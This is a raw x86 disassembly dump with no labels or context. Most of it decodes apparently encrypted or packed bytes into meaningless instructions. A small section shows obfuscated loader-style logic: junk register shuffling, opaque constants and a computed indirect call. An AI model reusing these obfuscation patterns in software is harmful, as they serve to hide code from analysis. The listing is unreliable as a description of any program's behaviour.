  40cd86:	ror    BYTE PTR [ebx-0x2a],1
  40cd89:	sahf   
  40cd8a:	ffreep st(0)
  40cd8c:	sub    eax,0x4650aea6
  40cd91:	jmp    0xa53:0x9b051231
  40cd98:	pop    esp
  40cd99:	leave  
  40cd9a:	mov    ?,WORD PTR [edx]
  40cd9c:	sti    
  40cd9d:	or     cl,BYTE PTR [edi]
  40cd9f:	popf   
  40cda0:	or     DWORD PTR ds:0x28a8b5e0,0xffffffc7
  40cda7:	xchg   esi,eax
  40cda8:	inc    edx
  40cda9:	sub    eax,0x4b1a6127
  40cdae:	inc    edx
  40cdaf:	xchg   edx,eax
  40cdb0:	cmp    dl,dl
  40cdb2:	jmp    edx
  40cdb4:	mov    bh,0x76
  40cdb6:	cmp    edi,edx
  40cdb8:	into   
  40cdb9:	mov    esp,0x4099b3b5
  40cdbe:	cmp    edx,eax
  40cdc0:	mov    BYTE PTR [ebp-0x58],ah
  40cdc3:	imul   edx,DWORD PTR [ebx],0x9ec47492
  40cdc9:	ins    DWORD PTR es:[edi],dx
  40cdca:	or     BYTE PTR [esi],dh
  40cdcc:	fchs   
  40cdce:	int    0x9a
  40cdd0:	and    al,0x1f
  40cdd2:	fmul   QWORD PTR [ecx]
  40cdd4:	dec    eax
  40cdd5:	mov    ds:0xde1b03ba,al
  40cdda:	frstor [ecx]
  40cddc:	push   esp
  40cddd:	adc    al,0xa2
  40cddf:	daa    
  40cde0:	and    cl,BYTE PTR [edx]
  40cde2:	lods   al,BYTE PTR ds:[esi]
  40cde3:	push   eax
  40cde4:	sbb    DWORD PTR [ecx+0x5f],ebp
  40cde7:	enter  0x5e7e,0x2f
  40cdeb:	outs   dx,DWORD PTR ds:[esi]
  40cdec:	mov    dl,0x72
  40cdee:	mov    dh,0xea
  40cdf0:	lahf   
  40cdf1:	nop
  40cdf2:	pop    ss
  40cdf3:	jmp    0xd5c3:0x118d79e1
  40cdfa:	mov    ds:0x580fec14,al
  40cdff:	push   edx
  40ce00:	add    edx,DWORD PTR [edi]
  40ce02:	mov    WORD PTR [eax+edi*1],es
  40ce05:	sub    ebp,DWORD PTR [edi+edx*4+0xd]
  40ce09:	mov    ebx,0x2d5b562
  40ce0e:	jp     0x40ce44
  40ce10:	fisttp DWORD PTR [ecx+eiz*1+0x43]
  40ce14:	cmp    cl,BYTE PTR ds:0x9cd4e4c5
  40ce1a:	cmp    BYTE PTR [edx+0x2882835c],al
  40ce20:	lea    esp,[ecx+0x6a942b7d]
  40ce26:	sub    BYTE PTR ds:0x85dd0700,dl
  40ce2c:	fsub   QWORD PTR es:[edi]
  40ce2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce30:	jb     0x40ce1a
  40ce32:	jb     0x40ce82
  40ce34:	cdq    
  40ce35:	xor    eax,0x87195c67
  40ce3a:	add    DWORD PTR [ecx],0xdd806bdc
  40ce40:	(bad)  
  40ce41:	and    BYTE PTR [ebx+0x19],bl
  40ce44:	mov    ebx,DWORD PTR [ecx+0xfc83b85]
  40ce4a:	test   BYTE PTR [ecx+0x0],dh
  40ce4d:	add    BYTE PTR [eax],al
  40ce4f:	mov    edi,DWORD PTR [ebp-0x14]
  40ce52:	mov    eax,DWORD PTR [ebp+0x8]
  40ce55:	mov    edx,DWORD PTR [ebp+0x14]
  40ce58:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40ce5c:	mov    ecx,0x7510893
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c16
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42389a
  40cf91:	push   0x423852
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a36
  40cff7:	mov    ebx,DWORD PTR ds:0x421a5e
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c16
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421c9a
  40d0ed:	mov    esi,DWORD PTR ds:0x421c92
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421c92,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	jle    0x40d0a8
  40d113:	ss or  al,0xc2
  40d116:	shl    DWORD PTR [edx+0x62],1
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx+0x31]
  40d11e:	rcl    DWORD PTR [ebx-0x61],1
  40d121:	div    BYTE PTR [ebx+eax*8-0x51]
  40d125:	repz in eax,dx
  40d127:	push   edx
  40d128:	and    al,0xd0
  40d12a:	xchg   ebp,eax
  40d12b:	bnd jb 0x40d12d
  40d12e:	test   al,0x7b
  40d130:	mov    ebx,edi
  40d132:	add    eax,0x3458087e
  40d137:	lea    ebp,[ebp+0x440c9cca]
  40d13d:	repz jae 0x40d100
  40d140:	fwait
  40d141:	sbb    bh,BYTE PTR [ebx+eiz*4-0x5b1a6c26]
  40d148:	mov    WORD PTR [esi-0x33],gs
  40d14b:	cmp    al,0x4d
  40d14d:	inc    esp
  40d14e:	aaa    
  40d14f:	(bad)  
  40d150:	jnp    0x40d0f6
  40d152:	pop    ecx
  40d153:	and    ecx,edx
  40d155:	adc    DWORD PTR [ecx],0x38edb25a
  40d15b:	and    BYTE PTR [edi-0x41],dh
  40d15e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d15f:	enter  0x7fb8,0x1b
  40d163:	jmp    0x40d1c2
  40d165:	repz retf 
  40d167:	imul   ebp,DWORD PTR [ebx+0x355ab00f],0xecd64ad5
  40d171:	faddp  st(6),st
  40d173:	sbb    eax,0x34c1dc39
  40d178:	or     eax,0x3076fc92
  40d17d:	push   ss
  40d17e:	xlat   BYTE PTR ds:[ebx]
  40d17f:	inc    edi
  40d180:	xchg   ecx,eax
  40d181:	test   al,0x83
  40d183:	loop   0x40d171
  40d185:	(bad)  
  40d186:	cli    
  40d187:	sub    BYTE PTR [eax-0x57df1e9a],bl
  40d18d:	mov    bh,0xd7
  40d18f:	jmp    0x40d13f
  40d191:	lahf   
  40d192:	and    DWORD PTR [ebp+0x1c],esi
  40d195:	mov    fs,di
  40d198:	stos   DWORD PTR es:[edi],eax
  40d199:	mov    edx,0xe41acc4c
  40d19e:	test   BYTE PTR [eax-0x7f],0x86
  40d1a2:	sahf   
  40d1a3:	push   edi
  40d1a4:	in     eax,dx
  40d1a5:	pusha  
  40d1a6:	jb     0x40d141
  40d1a8:	ret    0x4ff8
  40d1ab:	ss inc esp
  40d1ad:	push   edx
  40d1ae:	jl     0x40d191
  40d1b0:	jno    0x40d1e4
  40d1b2:	add    dh,dl
  40d1b4:	(bad)  
  40d1b5:	test   eax,0x418a71
  40d1ba:	les    edx,FWORD PTR [edx-0x7eef7c01]
  40d1c0:	jnp    0x40d1d4
  40d1c2:	add    eax,0x50ae6b66
  40d1c7:	add    dl,cl
  40d1c9:	sbb    bl,BYTE PTR [edx+0x14610ae5]
  40d1cf:	xor    dl,BYTE PTR [ebx+esi*4]
  40d1d2:	test   DWORD PTR [eax],0xa14da410
  40d1d8:	test   DWORD PTR [esi+0x3a68669d],0xd3e793d2
  40d1e2:	pop    ecx
  40d1e3:	add    esp,edi
  40d1e5:	(bad)  
  40d1e6:	in     al,dx
  40d1e7:	dec    ecx
  40d1e8:	mov    ch,0xbd
  40d1ea:	mov    cs,WORD PTR [ebx]
  40d1ec:	push   ebx
  40d1ed:	mov    ecx,0xa7a21e9b
  40d1f2:	sbb    al,0x35
  40d1f4:	adc    ecx,ebp
  40d1f6:	pop    ss
  40d1f7:	jbe    0x40d24a
  40d1f9:	je     0x40d201
  40d1fb:	cli    
  40d1fc:	std    
  40d1fd:	in     eax,0x53
  40d1ff:	cmp    edi,DWORD PTR [ecx+0x40]
  40d202:	mov    ds:0xa01d09d3,eax
  40d207:	(bad)  
  40d208:	outs   dx,BYTE PTR ds:[esi]
  40d209:	pushf  
  40d20a:	outs   dx,DWORD PTR ds:[esi]
  40d20b:	lods   eax,DWORD PTR gs:[esi]
  40d20d:	pop    ds
  40d20e:	pop    ss
  40d20f:	jge    0x40d1d8
  40d211:	(bad)  
  40d212:	iret   
  40d213:	dec    ebp
  40d214:	xchg   esp,eax
  40d215:	loop   0x40d285
  40d217:	in     eax,0x5e
  40d219:	jp     0x40d1d1
  40d21b:	cmp    al,BYTE PTR ds:0xff94cad1
  40d221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d222:	or     BYTE PTR [esi-0x18],dl
  40d225:	jmp    0xaaaf:0x83bddd66
  40d22c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d22d:	sti    
  40d22e:	das    
  40d22f:	(bad)  
  40d230:	jbe    0x40d279
  40d232:	lahf   
  40d233:	mov    esi,0x33df5251
  40d238:	fst    QWORD PTR [ecx]
  40d23a:	pop    esp
  40d23b:	(bad)  
  40d23c:	fisttp QWORD PTR [edi-0x38]
  40d23f:	or     ebp,DWORD PTR [ebx]
  40d241:	dec    edx
  40d242:	nop
  40d243:	and    dh,ah
  40d245:	pop    eax
  40d246:	(bad)  
  40d247:	jl     0x40d207
  40d249:	mov    ecx,DWORD PTR [ebp-0x3b]
  40d24c:	jb     0x40d243
  40d24e:	fcmove st,st(5)
  40d250:	dec    ecx
  40d251:	out    dx,eax
  40d252:	stc    
  40d253:	push   ecx
  40d254:	lahf   
  40d255:	push   eax
  40d256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d257:	and    bl,dl
  40d259:	(bad)  [esi+0x3d]
  40d25c:	push   ebp
  40d25d:	in     al,0x6b
  40d25f:	sti    
  40d260:	test   BYTE PTR [ecx+0x1d],bh
  40d263:	cmp    dl,BYTE PTR [esi]
  40d265:	fld    DWORD PTR [ebx]
  40d267:	enter  0x15b1,0xff
  40d26b:	and    al,0x3
  40d26d:	add    al,0x30
  40d26f:	lock jge 0x40d26c
  40d272:	mov    ss,esi
  40d274:	jge    0x40d251
  40d276:	and    bh,dl
  40d278:	popf   
  40d279:	js     0x40d237
  40d27b:	bound  eax,QWORD PTR [esp+ebp*1-0x1f]
  40d27f:	sbb    al,0x38
  40d281:	add    al,BYTE PTR [eax+eiz*1+0x78574b19]
  40d288:	pop    edi
  40d289:	in     eax,dx
  40d28a:	imul   esp,DWORD PTR [ebp+0x6f8a8b3f],0xfffffffb
  40d291:	add    eax,0xe576c64
  40d296:	xor    al,0x67
  40d298:	jne    0x40d279
  40d29a:	stos   DWORD PTR es:[edi],eax
  40d29b:	mov    esi,0x50a49903
  40d2a0:	add    DWORD PTR [edi+0x45415f5d],edi
  40d2a6:	push   es
  40d2a7:	pop    ds
  40d2a8:	in     al,0x29
  40d2aa:	ss hlt 
  40d2ac:	adc    bl,cl
  40d2ae:	xchg   BYTE PTR [eax-0x5857f909],al
  40d2b4:	int3   
  40d2b5:	mov    bl,0x66
  40d2b7:	enter  0x3678,0x96
  40d2bb:	mov    edx,0xb1a1cae5
  40d2c0:	inc    eax
  40d2c1:	ret    
  40d2c2:	mov    eax,ds:0x31ed9942
  40d2c7:	rol    BYTE PTR [esi],0xf0
  40d2ca:	pop    esp
  40d2cb:	jne    0x40d2c9
  40d2cd:	and    eax,0x8080ee0e
  40d2d2:	push   0x45
  40d2d4:	retf   
  40d2d5:	inc    eax
  40d2d6:	push   ds
  40d2d7:	xchg   ebx,edi
  40d2d9:	popf   
  40d2da:	fcom   QWORD PTR [edx-0x1f369e33]
  40d2e0:	adc    BYTE PTR [ecx+0x4],al
  40d2e3:	xchg   edx,eax
  40d2e4:	sbb    DWORD PTR [ebx+0x43f3744f],0x24f1dda6
  40d2ee:	cmp    al,BYTE PTR [edx+0x1d274b01]
  40d2f4:	mov    DWORD PTR [edi+0x3462033c],ecx
  40d2fa:	jb     0x40d2e8
  40d2fc:	dec    esi
  40d2fd:	add    DWORD PTR [esi+0x18],ebp
  40d300:	and    al,0x5c
  40d302:	pop    ds
  40d303:	inc    esp
  40d304:	cmp    DWORD PTR [ebp+0x139fbfe6],ecx
  40d30a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d30b:	or     BYTE PTR [edi-0x1f0d8d63],dl
  40d311:	inc    eax
  40d312:	push   0x8e696927
  40d317:	pop    ecx
  40d318:	or     bh,BYTE PTR [ecx-0x611e4973]
  40d31e:	push   es
  40d31f:	fxch   st(3)
  40d321:	jo     0x40d2d9
  40d323:	iret   
  40d324:	xor    ah,ch
  40d326:	fst    st(4)
  40d328:	fst    st(5)
  40d32a:	pop    ebp
  40d32b:	push   ss
  40d32c:	jo     0x40d2bf
  40d32e:	adc    eax,0x9385ada
  40d333:	enter  0x21fa,0xa6
  40d337:	test   al,0x98
  40d339:	jne    0x40d364
  40d33b:	fild   DWORD PTR [esi+0xb]
  40d33e:	les    edi,FWORD PTR [edx]
  40d340:	xchg   edi,eax
  40d341:	ret    0x71d0
  40d344:	and    al,0x38
  40d346:	sbb    DWORD PTR [eax-0x385d0fb],esi
  40d34c:	loope  0x40d399
  40d34e:	sbb    esp,DWORD PTR [eax+eax*8-0x2c34943b]
  40d355:	inc    edi
  40d356:	push   es
  40d357:	inc    esp
  40d358:	jo     0x40d383
  40d35a:	mov    ah,BYTE PTR ds:0x8fe07b1f
  40d360:	pop    esi
  40d361:	out    0x53,eax
  40d363:	add    al,0x55
  40d365:	aaa    
  40d366:	and    bl,BYTE PTR [ebp-0x5684ac06]
  40d36c:	adc    al,0x23
  40d36e:	xor    ebp,esi
  40d370:	int    0xff
  40d372:	or     esp,DWORD PTR [edi]
  40d374:	jns    0x40d355
  40d376:	push   esp
  40d377:	pusha  
  40d378:	test   al,0x8b
  40d37a:	int    0xef
  40d37c:	in     al,0x1b
  40d37e:	test   ecx,esp
  40d380:	adc    DWORD PTR [edx],eax
  40d382:	ret    
  40d383:	xchg   esp,eax
  40d384:	fcomip st,st(3)
  40d386:	ja     0x40d372
  40d388:	data16 ins BYTE PTR es:[edi],dx
  40d38a:	or     esi,DWORD PTR [edx-0x53]
  40d38d:	enter  0xbe47,0x3
  40d391:	inc    ebp
  40d392:	daa    
  40d393:	pop    edi
  40d394:	mov    esi,0x18d6cbfb
  40d399:	(bad)  
  40d39a:	test   al,0x51
  40d39c:	xor    DWORD PTR [esp+ecx*1],ebp
  40d39f:	xor    DWORD PTR [esp+ecx*2],ebx
  40d3a2:	xor    al,0x36
  40d3a4:	xor    edx,DWORD PTR [esi+ecx*4]
  40d3a7:	loop   0x40d3f7
  40d3a9:	xor    BYTE PTR [ebx-0x7f],cl
  40d3ac:	iret   
  40d3ad:	cwde   
  40d3ae:	adc    eax,0xcf0111a7
  40d3b3:	cmc    
  40d3b4:	pop    eax
  40d3b5:	or     DWORD PTR [ebx+ebx*2+0x50],ebx
  40d3b9:	sbb    al,0xae
  40d3bb:	and    ah,BYTE PTR [eax+0x37]
  40d3be:	call   0xcfb7:0xcf224697
  40d3c5:	fst    QWORD PTR [esi-0x24460888]
  40d3cb:	(bad)  
  40d3cc:	lds    ecx,FWORD PTR [eax+0x7e0faf9a]
  40d3d2:	popf   
  40d3d3:	push   0x38
  40d3d5:	jne    0x40d3fd
  40d3d7:	shr    DWORD PTR [edi+0x264c85d8],cl
  40d3dd:	mov    ecx,0xfa83fb54
  40d3e2:	jae    0x40d412
  40d3e4:	inc    edx
  40d3e5:	and    edx,DWORD PTR [eax]
  40d3e7:	jge    0x40d3c7
  40d3e9:	dec    ecx
  40d3ea:	shl    DWORD PTR [edi-0x66],cl
  40d3ed:	out    0x2f,al
  40d3ef:	mov    eax,0x60a468e5
  40d3f4:	cmp    ax,0x12b
  40d3f8:	pop    esp
  40d3f9:	jae    0x40d3e6
  40d3fb:	xor    eax,0xfc09d59
  40d400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d401:	pushf  
  40d402:	xchg   ebx,eax
  40d403:	add    DWORD PTR ds:[edi+0x20c902ae],0x7a
  40d40b:	inc    ebp
  40d40c:	addr16 cdq 
  40d40e:	bound  ebx,QWORD PTR [edx-0x4c]
  40d411:	and    BYTE PTR [ebp+edi*4-0x34],0x48
  40d416:	xchg   ebp,eax
  40d417:	scas   eax,DWORD PTR es:[edi]
  40d418:	mov    esi,0x4efc7767
  40d41d:	or     eax,DWORD PTR [edx-0x70]
  40d420:	push   ebx
  40d421:	sbb    eax,0xa9e0c697
  40d426:	xchg   ebx,eax
  40d427:	mov    WORD PTR [eax+0x2c919239],fs
  40d42d:	in     al,dx
  40d42e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d42f:	xchg   DWORD PTR [esi],eax
  40d431:	jbe    0x40d408
  40d433:	test   al,0x30
  40d435:	push   cs
  40d436:	cwde   
  40d437:	xchg   edx,eax
  40d438:	sub    eax,0x35168cde
  40d43d:	ror    BYTE PTR [bp+di+0xe],0xfb
  40d442:	cmp    dl,dh
  40d444:	xchg   ecx,eax
  40d445:	and    eax,esp
  40d447:	adc    ah,BYTE PTR [ecx]
  40d449:	xchg   ebx,eax
  40d44a:	jp     0x40d46d
  40d44c:	ja     0x40d495
  40d44e:	int3   
  40d44f:	enter  0xe4da,0x3a
  40d453:	mov    ecx,0xb55ba16b
  40d458:	jae    0x40d4be
  40d45a:	sar    DWORD PTR [eax],cl
  40d45c:	(bad)  
  40d45e:	jl     0x40d48b
  40d460:	inc    edx
  40d461:	std    
  40d462:	pop    edx
  40d463:	inc    esp
  40d464:	popf   
  40d465:	cli    
  40d466:	sbb    bl,BYTE PTR [ebx+0x4c]
  40d469:	xor    BYTE PTR fs:[ebx-0x1cc5b294],cl
  40d470:	std    
  40d471:	call   0xbd275ed6
  40d476:	lock jg 0x40d477
  40d479:	lock xor ebx,DWORD PTR [esi]
  40d47c:	jnp    0x40d476
  40d47e:	rol    BYTE PTR [ebp+ebp*1-0x482e5fcd],cl
  40d485:	outs   dx,DWORD PTR ds:[esi]
  40d486:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d487:	lds    ebx,FWORD PTR [eax]
  40d489:	mov    esp,ds
  40d48b:	gs jl  0x40d507
  40d48e:	sub    DWORD PTR [esi],ecx
  40d490:	mov    ds:0x438c98fb,eax
  40d495:	xchg   ebx,eax
  40d496:	ror    DWORD PTR [eax-0x589693db],1
  40d49c:	in     eax,0xac
  40d49e:	test   eax,0xc2ec22a9
  40d4a3:	adc    edx,DWORD PTR [edi]
  40d4a5:	mov    BYTE PTR [ecx+0x4e],al
  40d4a8:	xor    eax,0x71834d9b
  40d4ad:	in     al,dx
  40d4ae:	stc    
  40d4af:	imul   edi,DWORD PTR [ebp+edx*1+0x3e],0xab9d3f8a
  40d4b7:	cmp    DWORD PTR [esi],edx
  40d4b9:	sbb    eax,0xedf1c7d1
  40d4be:	(bad)  
  40d4bf:	stos   DWORD PTR es:[edi],eax
  40d4c0:	dec    edx
  40d4c1:	mov    dh,0xff
  40d4c3:	push   ss
  40d4c4:	(bad)  
  40d4c5:	rcr    BYTE PTR [ebx-0x29304cde],1
  40d4cb:	and    esi,0x65
  40d4ce:	mov    cl,0xdb
  40d4d0:	pop    edi
  40d4d1:	jmp    0xe13772a4
  40d4d6:	(bad)  
  40d4d7:	sti    
  40d4d8:	jmp    0x4939800c
  40d4dd:	push   esp
  40d4de:	enter  0xf15e,0x34
  40d4e2:	xchg   edi,eax
  40d4e3:	addr16 test bl,bh
  40d4e6:	xchg   ebp,eax
  40d4e7:	icebp  
  40d4e8:	pop    ecx
  40d4e9:	test   eax,0x7cd75538
  40d4ee:	add    esi,DWORD PTR es:[eax-0x376d5f15]
  40d4f5:	mov    edx,0xf02063d8
  40d4fa:	hlt    
  40d4fb:	jmp    0x40d527
  40d4fd:	push   ebx
  40d4fe:	xchg   esi,eax
  40d4ff:	add    DWORD PTR [eax-0x55],ebx
  40d502:	lods   al,BYTE PTR ds:[esi]
  40d503:	in     al,0x19
  40d505:	adc    al,0x68
  40d507:	je     0x40d51a
  40d509:	inc    ebx
  40d50a:	loopne 0x40d53e
  40d50c:	push   ebp
  40d50d:	out    dx,al
  40d50e:	xchg   ecx,eax
  40d50f:	in     eax,0x86
  40d511:	shl    DWORD PTR [edi],1
  40d513:	aaa    
  40d514:	jp     0x40d544
  40d516:	jle    0x40d587
  40d518:	lods   al,BYTE PTR ds:[esi]
  40d519:	fsubr  QWORD PTR ds:0x331aba4b
  40d51f:	pop    esi
  40d520:	jae    0x40d519
  40d522:	sbb    dl,0xa7
  40d525:	(bad)  
  40d526:	xor    esp,esp
  40d528:	fs push 0xfae5551c
  40d52e:	push   ebx
  40d52f:	bound  edx,QWORD PTR [edi+0x2c]
  40d532:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d533:	inc    esi
  40d534:	js     0x40d586
  40d536:	mov    dl,0xa6
  40d538:	mov    ds:0xee05fe32,al
  40d53d:	xchg   esi,eax
  40d53e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d53f:	icebp  
  40d540:	xlat   BYTE PTR ds:[ebx]
  40d541:	cmp    DWORD PTR [esi-0x31694bf8],edx
  40d547:	sub    BYTE PTR [edx-0x3a],ch
  40d54a:	mov    edi,0xaa5a899e
  40d54f:	addr16 sbb eax,0x466893cb
  40d555:	ror    DWORD PTR [ecx],1
  40d557:	cdq    
  40d558:	push   eax
  40d559:	jns    0x40d57e
  40d55b:	aad    0x9a
  40d55d:	xchg   ebx,eax
  40d55e:	xchg   BYTE PTR [ecx-0x42d30965],ah
  40d564:	lock jg 0x40d4ec
  40d567:	fldcw  WORD PTR [ebx+0x2ebaa716]
  40d56d:	mov    dl,0xe8
  40d56f:	sbb    al,BYTE PTR [esi-0x45fa16f8]
  40d575:	daa    
  40d576:	aas    
  40d577:	mov    dh,0x72
  40d579:	mov    esi,DWORD PTR [eax-0x3f]
  40d57c:	sbb    al,0xf
  40d57e:	pop    ss
  40d57f:	pop    eax
  40d580:	xchg   edi,eax
  40d581:	add    ch,BYTE PTR [esi-0x23]
  40d584:	inc    ebx
  40d585:	lods   al,BYTE PTR ds:[esi]
  40d586:	mov    ebx,0x9b4159a9
  40d58b:	xchg   edi,eax
  40d58c:	shl    BYTE PTR [eax-0x269b8216],0xff
  40d593:	scas   eax,DWORD PTR es:[edi]
  40d594:	lahf   
  40d595:	xchg   ebx,eax
  40d596:	out    0xc4,eax
